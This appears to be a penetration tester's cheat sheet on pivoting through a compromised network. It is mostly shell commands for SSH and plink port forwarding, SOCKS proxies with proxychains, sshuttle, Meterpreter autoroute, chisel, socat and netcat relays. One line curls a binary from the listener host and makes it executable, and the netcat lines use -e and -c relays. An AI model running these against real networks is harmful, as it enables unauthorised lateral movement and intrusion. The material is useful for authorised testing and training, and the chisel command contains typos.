# Pivoting

### Single reverse port forwarding

```bash
plink.exe -l root -pw password -R 445:127.0.0.1:445 <listener_ip>
ssh -l root -pw password -R 445:127.0.0.1:445 <listener_ip>
```

### Single Local port forwarding

```bash
ssh -l root -pw password -L 445:127.0.0.1:445 <target>
```

### Dynamic port forwarding

Socks proxy (socks5) 

```bash
ssh -l root -pw password -D 1234 <target>

# Reverse dynamic 
ssh -R 1234 <target>
```

Double SSH tunnel

```bash
ssh <1st_target> -L 2222:<2nd_target>:22
ssh localhost -p 2222 -D 1234
```

### Proxychains

```bash
# Choose any tools to create a socks proxy 
ssh <target> -D 1234

# Configure proxychains.conf with the protocl and port you chose for the socks proxy
sudo vim /etc/proxychains.conf 
	quiet_mode				   # enable this 
	socks5	127.0.0.1 1234     # change this

#Use any tool prepending the proxychains command :
proxychains wpscan --url <url> 
wpscan --url <url> --proxy socks5://127.0.0.1:1234 --force

# For nmap, you need to specify the -Pn and -sT arguments
proxychains nmap -sT -Pn <target>
```
> You can also forward a single port to avoid using a socks proxy, or use sshuttle


### SSHuttle

transparent proxy over ssh

```sh
# sudo apt-get update && sudo apt-get install sshuttle
sshuttle -r <target_ip>:22 <target_network>/24
```

---

### Meterpreter

```sh
#Socks Proxy
run autoroute -s <target_network>/24
use auxiliary/server/socks4a
exploit -j

# Port forward
portfwd add -l 3389 -p 3389 -r <target>
```

### Plink

```sh
plink.exe -l root -pw password -R 445:127.0.0.1:445 <listener_ip> [-P <listener_port>] 
```

### [Chisel](https://github.com/jpillora/chisel)

Socks proxy over SSH for Windows

```sh
git clone git clone https://github.com/jpilloria/chisel && cd chisel && go build && go build -ldflags="-s -w" && upx build chisel && chmod +x chisel
./chisel client <listener_ip>:10000 R:4506:127.0.0.1:4506
chisel server -p 10000 --reverse
```

### Socat

```sh
curl -sL http://<listener_ip>:1234/socat -o /tmp/socat && chmod +x /tmp/socat && cd /tmp

# remote forward : redirect all trafic coming from TCP 4506 to remote host
socat TCP-LISTEN:4506,reuseaddr,reuseport,fork,bind=<listener_ip> TCP:<remote_ip>:4506

# localhost forward : redirect all trafic coming from TCP 80 to TCP 5000
socat TCP-LISTEN:80,fork TCP:127.0.0.1:5000

```

### Netcat

```sh
nc -v -lk -p 8001 -e /usr/bin/nc 127.0.0.1 8000
nc.traditional -l -p 8001 -c "nc 127.0.0.1 8000"
```

### [ReGeorg](https://github.com/sensepost/reGeorg)

Socks proxy over web

## Scan 

[PortqryUI](https://www.microsoft.com/en-us/download/details.aspx?id=24009)

```sh
. .\Invoke-Portscan.ps1
Invoke-Portscan -Hosts <target>,<target2>
```

